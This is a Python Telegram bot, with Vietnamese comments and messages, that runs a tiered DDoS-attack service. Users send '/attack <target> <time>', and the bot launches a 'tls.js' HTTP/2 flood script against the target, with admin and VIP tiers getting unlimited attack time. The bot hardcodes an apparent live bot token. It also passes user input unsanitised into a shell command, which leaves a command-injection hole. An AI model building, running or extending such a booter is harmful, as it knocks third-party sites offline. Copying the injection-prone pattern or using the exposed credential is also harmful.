import asyncio
import subprocess
import shlex
import time
import psutil
from telegram import Update
from telegram.ext import Application, CommandHandler, ContextTypes

# Thay thế bằng token bot của bạn
BOT_TOKEN = "8404591037:AAFn-zck0anDPjaR2mcSY8fulg5-Iphdq6A"

# Cấu hình admin và VIP
ADMIN_IDS = {7105201572}
VIP_IDS = {555555555, 666666666}

# Dictionary để lưu thông tin
user_cooldown = {}
active_attacks = {}
USER_COOLDOWN = 120
MAX_USER_TIME = 120

async def start_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    user_type = get_user_type(user_id)
    
    welcome_text = f"""
🤖 Bot Attack TLS đã khởi động!

👤 Loại tài khoản: {user_type}
💡 Các lệnh có sẵn:
/attack <target> <time> - Gửi request tấn công
/stop - Dừng cuộc tấn công của bạn
/stopall - Dừng tất cả (Admin only)
/status - Xem trạng thái
/myinfo - Thông tin tài khoản

📋 Quy định:
{get_usage_rules(user_type)}
    """
    await update.message.reply_text(welcome_text)

async def attack_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    user_type = get_user_type(user_id)
    
    if not context.args or len(context.args) < 2:
        await update.message.reply_text(
            "❌ Sai cú pháp!\n"
            "✅ Sử dụng: /attack <target> <time>\n"
            "📝 Ví dụ: /attack example.com 60"
        )
        return

    target = context.args[0]
    attack_time = int(context.args[1])
    
    # Kiểm tra quyền
    check_result = check_attack_permission(user_id, user_type, attack_time)
    if not check_result["allowed"]:
        await update.message.reply_text(check_result["message"])
        return
    
    # Kiểm tra nếu đang có tấn công
    if user_id in active_attacks:
        await update.message.reply_text("❌ Bạn đã có cuộc tấn công đang chạy! Dùng /stop để dừng.")
        return

    try:
        processing_msg = await update.message.reply_text(
            f"🎯 Đang khởi động tấn công...\n"
            f"🎯 Target: {target}\n"
            f"⏰ Thời gian: {attack_time}s\n"
            f"👤 User: {user_type}"
        )
        
        # Tạo lệnh
        command = f"timeout {attack_time} node tls.js GET {target} {attack_time} 4 5 y.txt --http 2 --debug --winter --full"
        
        # Chạy lệnh trong background (non-blocking)
        process = await asyncio.create_subprocess_shell(
            command,
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.PIPE,
            shell=True
        )
        
        # Lưu thông tin process
        active_attacks[user_id] = {
            'process': process,
            'target': target,
            'start_time': time.time(),
            'message': processing_msg
        }
        
        # Cập nhật cooldown cho user thường
        if user_type == "User Thường":
            user_cooldown[user_id] = time.time()
        
        # Theo dõi process trong background
        asyncio.create_task(track_attack_process(user_id, process, target, attack_time, processing_msg))
        
        await processing_msg.edit_text(
            f"✅ Đã bắt đầu tấn công!\n"
            f"🎯 Target: {target}\n"
            f"⏰ Thời gian: {attack_time}s\n"
            f"👤 User: {user_type}\n"
            f"🆔 ID: {user_id}"
        )
        
    except Exception as e:
        await update.message.reply_text(f"❌ Lỗi khi khởi động: {str(e)}")

async def track_attack_process(user_id, process, target, attack_time, message):
    """Theo dõi process tấn công trong background"""
    try:
        # Chờ process hoàn thành
        stdout, stderr = await process.communicate()
        
        # Xóa khỏi active attacks khi hoàn thành
        if user_id in active_attacks:
            del active_attacks[user_id]
        
        # Xử lý kết quả
        if process.returncode == 0:
            result_text = f"✅ Tấn công hoàn thành: {target} ({attack_time}s)"
            output = stdout.decode().strip()
            if output:
                short_output = output[:300] + ("..." if len(output) > 300 else "")
                result_text += f"\n📊 Output: {short_output}"
        else:
            error_msg = stderr.decode().strip() or "Lỗi không xác định"
            result_text = f"❌ Lỗi tấn công {target}: {error_msg}"
        
        await message.edit_text(result_text)
        
    except Exception as e:
        if user_id in active_attacks:
            del active_attacks[user_id]
        await message.edit_text(f"❌ Lỗi theo dõi process: {str(e)}")

async def stop_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    
    if user_id not in active_attacks:
        await update.message.reply_text("❌ Bạn không có cuộc tấn công nào đang chạy.")
        return
    
    try:
        attack_info = active_attacks[user_id]
        process = attack_info['process']
        target = attack_info['target']
        
        # Dừng process và tất cả process con
        await kill_process_tree(process)
        
        # Xóa khỏi active attacks
        del active_attacks[user_id]
        
        await update.message.reply_text(f"🛑 Đã dừng tấn công: {target}")
        
    except Exception as e:
        await update.message.reply_text(f"❌ Lỗi khi dừng: {str(e)}")

async def stop_all_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    user_type = get_user_type(user_id)
    
    if user_type != "Admin":
        await update.message.reply_text("❌ Chỉ Admin mới có quyền này!")
        return
    
    if not active_attacks:
        await update.message.reply_text("❌ Không có cuộc tấn công nào đang chạy.")
        return
    
    stopped_count = 0
    for uid, attack_info in list(active_attacks.items()):
        try:
            process = attack_info['process']
            await kill_process_tree(process)
            del active_attacks[uid]
            stopped_count += 1
        except:
            continue
    
    await update.message.reply_text(f"🛑 Đã dừng {stopped_count} cuộc tấn công!")

async def kill_process_tree(process):
    """Dừng process và tất cả process con"""
    try:
        # Lấy PID của process
        if process.returncode is None:  # Process vẫn đang chạy
            # Dùng psutil để tìm và dừng tất cả process con
            parent = psutil.Process(process.pid)
            children = parent.children(recursive=True)
            
            # Dừng tất cả process con
            for child in children:
                child.terminate()
            
            # Chờ process con dừng
            gone, still_alive = psutil.wait_procs(children, timeout=5)
            
            # Force kill những process còn sống
            for child in still_alive:
                child.kill()
            
            # Dừng process cha
            parent.terminate()
            try:
                parent.wait(timeout=5)
            except psutil.TimeoutExpired:
                parent.kill()
                
    except (psutil.NoSuchProcess, ProcessLookupError):
        pass
    except Exception:
        pass
    
    # Đảm bảo process chính bị dừng
    try:
        process.terminate()
        await asyncio.wait_for(process.wait(), timeout=5)
    except (asyncio.TimeoutError, ProcessLookupError):
        try:
            process.kill()
        except:
            pass

async def status_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    user_type = get_user_type(user_id)
    
    if not active_attacks:
        await update.message.reply_text("📊 Không có cuộc tấn công nào đang chạy.")
        return
    
    status_text = "📊 **Trạng thái tấn công:**\n\n"
    
    for uid, info in active_attacks.items():
        target = info['target']
        start_time = info['start_time']
        elapsed = int(time.time() - start_time)
        
        status_text += f"🎯 **Target:** {target}\n"
        status_text += f"👤 **User ID:** {uid}\n"
        status_text += f"⏰ **Thời gian chạy:** {elapsed}s\n"
        status_text += "━━━━━━━━━━━━━━━━\n"
    
    if user_type != "Admin":
        status_text = "📊 **Trạng thái của bạn:**\n\n"
        if user_id in active_attacks:
            info = active_attacks[user_id]
            target = info['target']
            start_time = info['start_time']
            elapsed = int(time.time() - start_time)
            
            status_text += f"🎯 **Target:** {target}\n"
            status_text += f"⏰ **Thời gian chạy:** {elapsed}s\n"
        else:
            status_text += "❌ Bạn không có cuộc tấn công nào đang chạy."
    
    await update.message.reply_text(status_text, parse_mode='Markdown')

async def myinfo_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    user_type = get_user_type(user_id)
    
    info_text = f"""
📊 Thông tin tài khoản:

🆔 User ID: `{user_id}`
👤 Loại tài khoản: {user_type}
📋 Quyền hạn: {get_permissions_text(user_type)}
🎯 Đang chạy: {'CÓ' if user_id in active_attacks else 'KHÔNG'}
    """
    
    if user_type == "User Thường":
        remaining_cooldown = get_remaining_cooldown(user_id)
        if remaining_cooldown > 0:
            info_text += f"\n⏰ Cooldown còn lại: {remaining_cooldown} giây"
        else:
            info_text += f"\n✅ Có thể sử dụng lệnh ngay"
    
    await update.message.reply_text(info_text, parse_mode='Markdown')

async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    help_text = """
📖 **Hướng dẫn sử dụng:**

⚡ **Lệnh tấn công:**
/attack <target> <time>
• target: URL hoặc IP mục tiêu
• time: Thời gian tấn công (giây)

🛑 **Lệnh dừng:**
/stop - Dừng cuộc tấn công của bạn
/stopall - Dừng tất cả tấn công (chỉ Admin)

📊 **Lệnh trạng thái:**
/status - Xem trạng thái tấn công
/myinfo - Thông tin tài khoản

📋 **Quy định sử dụng:**
• Admin: Không giới hạn
• VIP: Không giới hạn  
• User thường: Tối đa 120s, cooldown 120s
    """
    await update.message.reply_text(help_text, parse_mode='Markdown')

def get_user_type(user_id):
    if user_id in ADMIN_IDS:
        return "Admin"
    elif user_id in VIP_IDS:
        return "VIP"
    else:
        return "User Thường"

def get_usage_rules(user_type):
    if user_type == "Admin":
        return "• Thời gian: KHÔNG GIỚI HẠN\n• Cooldown: KHÔNG CÓ\n• Quyền: Dừng tất cả tấn công"
    elif user_type == "VIP":
        return "• Thời gian: KHÔNG GIỚI HẠN\n• Cooldown: KHÔNG CÓ"
    else:
        return f"• Thời gian: Tối đa {MAX_USER_TIME}s\n• Cooldown: {USER_COOLDOWN}s"

def get_permissions_text(user_type):
    if user_type == "Admin":
        return "Toàn quyền (Unlimited + Stop All)"
    elif user_type == "VIP":
        return "VIP (Unlimited)"
    else:
        return f"Standard (Max {MAX_USER_TIME}s, CD {USER_COOLDOWN}s)"

def check_attack_permission(user_id, user_type, attack_time):
    if user_type == "User Thường" and attack_time > MAX_USER_TIME:
        return {
            "allowed": False,
            "message": f"❌ User thường chỉ được tối đa {MAX_USER_TIME} giây!"
        }
    
    if user_type == "User Thường":
        remaining = get_remaining_cooldown(user_id)
        if remaining > 0:
            return {
                "allowed": False,
                "message": f"⏰ Vui lòng chờ {remaining} giây trước khi sử dụng lại lệnh!"
            }
    
    return {"allowed": True, "message": ""}

def get_remaining_cooldown(user_id):
    if user_id not in user_cooldown:
        return 0
    
    elapsed = time.time() - user_cooldown[user_id]
    remaining = USER_COOLDOWN - elapsed
    return max(0, int(remaining))

def main():
    # Khởi tạo application
    application = Application.builder().token(BOT_TOKEN).build()
    
    # Thêm handlers
    application.add_handler(CommandHandler("start", start_command))
    application.add_handler(CommandHandler("attack", attack_command))
    application.add_handler(CommandHandler("stop", stop_command))
    application.add_handler(CommandHandler("stopall", stop_all_command))
    application.add_handler(CommandHandler("status", status_command))
    application.add_handler(CommandHandler("myinfo", myinfo_command))
    application.add_handler(CommandHandler("help", help_command))
    
    # Chạy bot
    print("🤖 Bot đang chạy...")
    print("⚡ Sử dụng non-blocking processes")
    print("🛑 Có thể dừng tấn công bất kỳ lúc nào")
    application.run_polling()

if __name__ == "__main__":
    main()
